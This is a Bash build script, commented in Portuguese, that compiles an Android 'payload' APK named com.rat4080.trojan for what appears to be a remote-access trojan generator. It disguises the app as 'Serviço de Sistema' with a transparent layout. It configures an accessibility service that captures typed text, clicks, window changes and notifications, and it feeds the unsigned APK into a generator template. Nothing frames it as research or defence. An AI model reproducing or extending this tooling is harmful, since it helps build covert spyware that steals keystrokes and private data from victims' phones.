#!/bin/bash
# Script de compilação do payload Android
# Requer: Android SDK, Gradle

echo "[+] A compilar payload Android..."

# Navega para o diretório do payload
cd "$(dirname "$0")/payload"

# Verifica se o SDK está configurado
if [ -z "$ANDROID_HOME" ]; then
    echo "[-] ANDROID_HOME não definido"
    echo "    Exporta: export ANDROID_HOME=/caminho/para/android-sdk"
    exit 1
fi

# Cria a estrutura Gradle
mkdir -p app/src/main/java/com/rat4080/trojan
mkdir -p app/src/main/res/layout
mkdir -p app/src/main/res/values
mkdir -p app/src/main/res/xml

# Copia ficheiros
cp src/com/rat4080/trojan/*.java app/src/main/java/com/rat4080/trojan/
cp AndroidManifest.xml app/src/main/AndroidManifest.xml

# Cria ficheiros de recursos
cat > app/src/main/res/values/strings.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Serviço de Sistema</string>
</resources>
EOF

cat > app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@android:color/transparent">
</FrameLayout>
EOF

cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewClicked|typeWindowStateChanged|typeNotificationStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:description="Serviço de Sistema"
    android:notificationTimeout="100" />
EOF

# Cria build.gradle
cat > app/build.gradle << 'EOF'
apply plugin: 'com.android.application'

android {
    compileSdkVersion 34
    buildToolsVersion "34.0.0"

    defaultConfig {
        applicationId "com.rat4080.trojan"
        minSdkVersion 21
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF

cat > build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}
EOF

cat > settings.gradle << 'EOF'
include ':app'
EOF

# Compila
echo "[+] A compilar APK de release..."
./gradlew assembleRelease

if [ $? -eq 0 ]; then
    APK_PATH="app/build/outputs/apk/release/app-release-unsigned.apk"
    echo "[+] APK compilado: $APK_PATH"
    echo "[+] Copia para gerador/template/payload_template.apk"
    mkdir -p ../gerador/template
    cp "$APK_PATH" ../gerador/template/payload_template.apk
    echo "[+] Template atualizado com sucesso!"
else
    echo "[-] Falha na compilação"
    exit 1
fi
